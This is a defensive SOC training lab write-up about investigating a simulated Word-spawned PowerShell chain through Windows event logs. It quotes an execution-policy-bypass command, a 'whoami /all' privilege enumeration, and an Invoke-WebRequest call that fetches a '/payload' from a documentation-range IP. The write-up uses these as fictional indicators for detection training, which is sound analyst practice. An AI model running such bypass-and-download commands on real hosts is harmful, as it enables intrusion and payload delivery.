# LAB 03 — PowerShell & Process Investigation

## Overview

This lab focuses on investigating suspicious Windows process execution and PowerShell activity from a SOC Analyst perspective.

The objective is to identify unusual process behavior, analyze execution commands, reconstruct process relationships, and recognize potential indicators of compromise (IOCs).

**Environment:** Wazuh-inspired simulated SOC environment  
**Host:** WIN-CLIENT-01  
**User:** administrator  
**Severity:** High  
**Event IDs:** 4688, 4104

## Investigation Scenario

The SOC monitoring team identified suspicious PowerShell activity following a remote authentication event.

The investigation focused on understanding the process execution chain and identifying potentially malicious behavior.

## Events Investigated

| Event ID | Description |
|---|---|
| 4688 | Process Creation |
| 4104 | PowerShell Script Block Logging |

## Process Investigation

The following process execution chain was identified:

```text
winword.exe
    └── powershell.exe
            └── cmd.exe
                    └── whoami.exe
```

### Process Details

| Process | Parent Process | User |
|---|---|---|
| powershell.exe | winword.exe | administrator |
| cmd.exe | powershell.exe | administrator |
| whoami.exe | cmd.exe | administrator |

## Command-Line Analysis

The following PowerShell command was identified:

```powershell
powershell.exe -ExecutionPolicy Bypass -File script.ps1
```

The script contained the following commands:

```powershell
whoami /all

Invoke-WebRequest -Uri "https://198.51.100.25/payload"
```

### Suspicious Indicators

- **ExecutionPolicy Bypass:** PowerShell execution using a policy bypass parameter.
- **Process Chaining:** Microsoft Word launching PowerShell, followed by CMD.
- **Privilege Enumeration:** `whoami /all` collecting user and group information.
- **External Communication:** `Invoke-WebRequest` attempting an HTTP request to an external destination.

## Investigation Findings

The investigation identified:

1. PowerShell execution initiated by `winword.exe`.
2. Use of the `ExecutionPolicy Bypass` parameter.
3. Child process creation involving `cmd.exe` and `whoami.exe`.
4. Execution of commands to enumerate user privileges.
5. An attempted external web request.

## SOC Assessment

**Classification:** Suspicious Activity  
**Severity:** High — requires further investigation.

The observed behavior is consistent with potentially malicious execution. However, the available evidence is insufficient to confirm malware infection or successful data exfiltration.

## Recommended Actions

1. Preserve relevant Windows event logs.
2. Collect and calculate the SHA-256 hash of the PowerShell script.
3. Investigate the origin of the Word document.
4. Verify whether the external network connection was successfully established.
5. Escalate the incident for further investigation.
6. Consider endpoint containment according to organizational incident response procedures.

## Skills Demonstrated

- Windows Event Log Analysis
- Event ID 4688 Investigation
- PowerShell Script Analysis
- Event ID 4104 Analysis
- Process Tree Investigation
- Parent and Child Process Identification
- Command-Line Analysis
- Suspicious Behavior Detection
- Basic SOC Incident Assessment

## Lab Environment and Limitations

This exercise was conducted using a simulated Wazuh-inspired interface and fictional security event records.

The IP address `198.51.100.25` belongs to a reserved documentation range and does not represent a real malicious destination.

No live Wazuh telemetry or real endpoint compromise was involved.

---

**Project:** SOC Analyst Jr — Practical Labs  
**Lab:** 03 — PowerShell & Process Investigation
